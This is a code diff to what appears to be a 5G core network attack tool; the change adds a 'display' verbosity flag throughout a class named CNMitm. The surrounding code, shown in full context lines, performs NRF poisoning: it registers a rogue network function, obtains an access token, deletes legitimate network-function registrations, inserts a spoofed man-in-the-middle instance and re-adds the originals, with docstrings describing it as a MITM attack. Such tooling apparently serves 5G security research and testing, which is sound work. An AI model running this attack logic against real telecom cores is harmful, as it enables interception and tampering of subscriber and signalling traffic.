@@ -13,7 +13,7 @@ class CNMitm:
     spoofed_instance: NFInstance|None = None
     mitm_instance: NFInstance|None = None
     
-    def _nrf_poisonning(nf_to_spoof: str) -> bool: 
+    def _nrf_poisonning(nf_to_spoof: str, display=True) -> bool: 
         """
         Performs NRF poisoning by removing legitimate NF instances of the specified type, 
         registering a spoofed attacker NF instance, and then re-adding the legitimate instances.
@@ -24,7 +24,7 @@ class CNMitm:
         """
         
         # Get the list of registered NFs with the right type
-        infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof)
+        infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof, display=display)
         if "nfInstances" not in infos or not infos["nfInstances"]:
             return False
 
@@ -43,7 +43,7 @@ class CNMitm:
             
             # Create instance object and add them to a list
             legitimate_instance = NFInstance(legitimate_id, nf_to_spoof, legitimate_address, legitimate_services)
-            removed = legitimate_instance.remove_nf(CNMitm.attacker_token)
+            removed = legitimate_instance.remove_nf(CNMitm.attacker_token, display=display)
             removed_instances.append(legitimate_instance)
             
             if not removed :
@@ -65,18 +65,18 @@ class CNMitm:
         CNMitm.spoofed_instance = random_instance
         
         # Add the attacker as a NF of the right type
-        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr)
+        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr, display=display)
         
         # Re-add the legitimate NFs
         for i in removed_instances:
-            added = NFInstance.add_nf(i.nf_instance_id, nf_to_spoof, i.services, i.ip_address)
+            added = NFInstance.add_nf(i.nf_instance_id, nf_to_spoof, i.services, i.ip_address, display=display)
             
             if not added :
                 return False
                         
         return True
                       
-    def start(nf_to_spoof:str) -> bool:
+    def start(nf_to_spoof:str, display=True) -> bool:
         """
         Starts a MITM attack by spoofing a network function (NF) in the 5G core network.
         Args:
@@ -88,14 +88,14 @@ class CNMitm:
         os.popen("pkill -f socat")
         
         # Get a token
-        CNMitm.attacker_instance = NFInstance.add_random_nf()
-        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF")
+        CNMitm.attacker_instance = NFInstance.add_random_nf(display=display)
+        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF", display=display)
         
         if not CNMitm.attacker_token : 
             return False
         
         # Start the poisonning
-        if not CNMitm._nrf_poisonning(nf_to_spoof):
+        if not CNMitm._nrf_poisonning(nf_to_spoof, display=display):
             return False
         
         # The MITM redirect every incoming message to the legitimate NF
